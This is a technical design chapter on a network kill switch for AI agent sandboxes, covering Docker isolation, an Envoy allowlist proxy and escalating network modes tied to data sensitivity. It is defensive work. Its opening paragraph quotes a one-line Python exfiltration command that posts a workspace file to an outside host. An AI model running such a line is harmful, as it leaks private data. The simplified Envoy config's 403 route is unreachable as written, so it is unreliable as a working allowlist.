## Kill switch

When an agent executes arbitrary code inside a sandbox, the tool permission system cannot enforce boundaries. The `@tool_permission` decorator with `CONNECT` checks whether the agent is *allowed* to call a tool, but it has no authority over what happens inside a Docker container where the agent runs Python, shell commands, or any other language. A one-liner `requests.post("https://external.com", data=open("/workspace/data.csv").read())` bypasses every permission check because it never goes through the tool-calling path. The sandbox section describes how `network_mode="none"` addresses this by removing the container's network stack entirely when private data enters the session. This section steps back and examines the broader design: how to build a network kill switch that can operate at different levels of granularity, and how to make it dynamic enough to activate mid-conversation without disrupting the agent's work.

### The binary switch

The simplest form of the kill switch is a binary choice: full network access or no network access at all. Docker's `network_mode="none"` implements this by stripping every network interface from the container except loopback. No DNS resolution, no TCP connections, no UDP traffic. The container becomes a compute island that can read and write files on its mounted workspace but cannot reach anything beyond `127.0.0.1`.

The `PrivateData` compliance module drives this switch. When a connector retrieves sensitive records -- patient data from a database, financial reports from an internal API -- it calls `PrivateData.add_private_dataset()` to register the dataset and its sensitivity level. The sandbox manager checks this state on every session access. If the session has private data and the container still has full network access, the manager stops the container and creates a new one with `network_mode="none"`, mounting the same workspace directory so files survive the transition.

```python
class NetworkMode(str, Enum):
    FULL = "bridge"
    NONE = "none"

def get_network_mode(user_id: str, session_id: str) -> NetworkMode:
    if session_has_private_data(user_id, session_id):
        return NetworkMode.NONE
    return NetworkMode.FULL
```

This transition is a one-way ratchet. Once private data enters the session, network access never returns. The sensitivity level can escalate (from INTERNAL to CONFIDENTIAL to SECRET) but never decrease, and the network stays off for the remainder of the session's lifetime. This mirrors the real-world principle that you cannot "un-see" data -- once an agent has processed confidential records, any subsequent code it generates could embed fragments of that data in network requests.

The binary switch works well for sessions where the data sensitivity is clear-cut. A session analyzing anonymized public datasets runs with full network access. A session processing patient records runs with no network at all. The decision is simple, auditable, and impossible to circumvent from inside the container.

### The problem with binary

The limitation of the binary switch becomes apparent in mixed workflows. An enterprise agent often needs to combine private data with external services that are themselves trusted: an internal company API, a data warehouse behind the VPN, a cloud service with a Zero Data Retention (ZDR) agreement that guarantees no data is stored or logged on the provider's side. Cutting all network access forces the agent to stop mid-task whenever it needs to reach one of these services after private data has entered the session.

Consider a concrete scenario. The agent queries an internal database to retrieve employee compensation data (confidential). It then needs to call an internal payroll API to validate some of the figures. Both systems are internal, both are trusted, and no data leaves the company perimeter. With the binary kill switch, the agent cannot make the API call because all network access was revoked when the compensation data entered the session.

The tension is between safety and utility. Blocking everything is safe but overly restrictive. Allowing everything is useful but dangerous. What we need is selective connectivity: allow the container to reach trusted endpoints while blocking everything else.

### Envoy proxy for selective connectivity

The solution is to place an Envoy proxy between the container and the network, and route all outbound traffic through it. The proxy holds a whitelist of allowed destinations. Requests to whitelisted URLs pass through; everything else is rejected. The container itself has network access, but only through the proxy, and the proxy enforces which destinations are reachable.

The architecture uses two Docker networks. The first is an internal network with no external route, connecting only the sandbox container and the Envoy proxy container. The second is the default bridge network that gives the proxy container access to the outside world. The sandbox container cannot reach the internet directly because its only network has no gateway. It can only reach the proxy, and the proxy decides what traffic to forward.

```
                  internal network              bridge network
                  (no gateway)                  (internet access)

 +-------------+                 +-------+                    +-----------+
 |  Sandbox    | --- HTTP(S) --> | Envoy | --- HTTP(S) -->    | Trusted   |
 |  Container  |                 | Proxy |                    | Services  |
 +-------------+                 +-------+                    +-----------+
                                     |
                                     X--- blocked -->  Untrusted destinations
```

The Envoy configuration defines the allowed destinations as clusters and routes. A route matching an allowed domain forwards the request to its cluster. A default route returns 403 Forbidden. The configuration can be as simple as a list of allowed hostnames, or as granular as path-level rules.

```yaml
# Simplified Envoy route configuration
virtual_hosts:
  - name: allowed
    domains: ["*"]
    routes:
      - match: { prefix: "/" }
        route: { cluster: payroll_api }
        request_headers_to_add:
          - header: { key: "x-envoy-upstream-rq-timeout-ms", value: "5000" }
      - match: { prefix: "/" }
        direct_response:
          status: 403
          body: { inline_string: "Destination not in allowlist" }

clusters:
  - name: payroll_api
    type: STRICT_DNS
    load_assignment:
      endpoints:
        - lb_endpoints:
            - endpoint:
                address:
                  socket_address: { address: "payroll.internal.corp", port_value: 443 }
```

The whitelist is not per-session. It is a platform-level configuration that defines which external services the organization trusts enough to receive data from agent sessions. Typical entries include internal APIs, data warehouses, cloud services with ZDR contracts, and monitoring endpoints. The list is maintained by the platform team, not by the agent or the user, and changes to it follow the same review process as any infrastructure configuration.

### Three network modes

With the proxy in place, the `NetworkMode` enum gains a third option:

```python
class NetworkMode(str, Enum):
    FULL = "bridge"
    PROXIED = "proxied"
    NONE = "none"
```

The mode selection now considers both the presence of private data and the sensitivity level. PUBLIC and INTERNAL data require no restriction -- the session runs with full network access. CONFIDENTIAL data triggers the proxied mode, routing traffic through Envoy so the agent can still reach trusted services but nothing else. SECRET data triggers the full kill switch with no network access whatsoever.

```python
def get_network_mode(user_id: str, session_id: str) -> NetworkMode:
    pd = PrivateData(user_id, session_id)
    if not pd.has_private_data:
        return NetworkMode.FULL
    match pd.sensitivity:
        case DataSensitivity.PUBLIC | DataSensitivity.INTERNAL:
            return NetworkMode.FULL
        case DataSensitivity.CONFIDENTIAL:
            return NetworkMode.PROXIED
        case DataSensitivity.SECRET:
            return NetworkMode.NONE
```

The ratchet behavior still applies. Sensitivity can escalate from CONFIDENTIAL to SECRET mid-session, causing the container to be recreated with a more restrictive network mode. It cannot go the other direction. A session that was proxied can become fully isolated, but a fully isolated session never regains connectivity.

### Dynamic switching

The dynamic switch is the same mechanism described in the sandbox section, extended to handle three modes instead of two. The sandbox manager checks `get_network_mode()` on every `get_or_create_session()` call and compares the result against the container's current network mode. If the required mode is more restrictive than the current mode, the manager stops the container and creates a new one with the correct network configuration, reattaching the workspace volume.

```python
_MODE_SEVERITY = {NetworkMode.FULL: 0, NetworkMode.PROXIED: 1, NetworkMode.NONE: 2}

def _ensure_network_mode(self, session: Session) -> None:
    required = get_network_mode(session.user_id, session.session_id)
    if _MODE_SEVERITY[required] <= _MODE_SEVERITY[session.network_mode]:
        return
    self._recreate_container(session, network_mode=required)
```

The container recreation is transparent to the agent. The workspace directory is a bind mount that survives container lifecycle changes. The agent may notice a brief pause while the new container starts, but all files, intermediate results, and generated code remain in place. From the agent's perspective, the only observable change is that some network destinations that were previously reachable now return errors.

The transition from FULL to PROXIED requires creating the Envoy sidecar if it does not already exist. The sandbox manager launches the proxy container on the internal network, applies the whitelist configuration, and then attaches the new sandbox container to the same internal network. The proxy container can be shared across multiple sandbox sessions if they all operate at the CONFIDENTIAL level, since it is stateless and the whitelist is platform-wide.

### What the agent sees

From the agent's perspective, the kill switch manifests as network errors. Code that tries to reach a blocked destination gets a connection refused (NONE mode) or a 403 response (PROXIED mode). The agent has no mechanism to disable the switch, reconfigure the proxy, or escalate its own network privileges. These controls live outside the container, in infrastructure the agent cannot modify.

For a better user experience, the system can inject a message into the agent's context when the network mode changes, explaining what happened and why. This lets the agent adapt its strategy rather than repeatedly failing on blocked requests.

```
[SYSTEM] Network access has been restricted because confidential data
entered this session. Outbound connections are limited to approved
internal services. External API calls will be blocked.
```

The agent can then decide to work with the data locally, use an approved service, or ask the user for guidance -- rather than wasting turns on requests that will never succeed.

### Relationship to tool permissions

The kill switch and the tool permission system are independent enforcement layers that protect against different vectors. Tool permissions prevent the agent from calling tools it should not use -- for example, blocking a `CONNECT`-tagged tool when private data is present. The kill switch prevents code inside the sandbox from making network connections that bypass the tool system entirely.

Neither layer depends on the other. An agent session with private data has both protections active simultaneously: tool permissions block the tool-calling path, and the kill switch blocks the code-execution path. This defense-in-depth means that a failure or misconfiguration in one layer does not expose the data through the other.

```
Agent
  |
  |-- Tool call path
  |     @tool_permission(CONNECT) blocks exfiltration tools
  |
  |-- Code execution path (sandbox)
        Kill switch blocks network at infrastructure level
        (NONE: all traffic blocked, PROXIED: only whitelist allowed)
```

Together with the `PrivateData` compliance module that drives both layers, the system provides a coherent data protection pipeline: connectors tag data as it enters the session, tool permissions restrict the agent's tool vocabulary, and the kill switch restricts the sandbox's network reach. Each layer operates at a different level of the stack, and all three activate automatically from the same trigger.
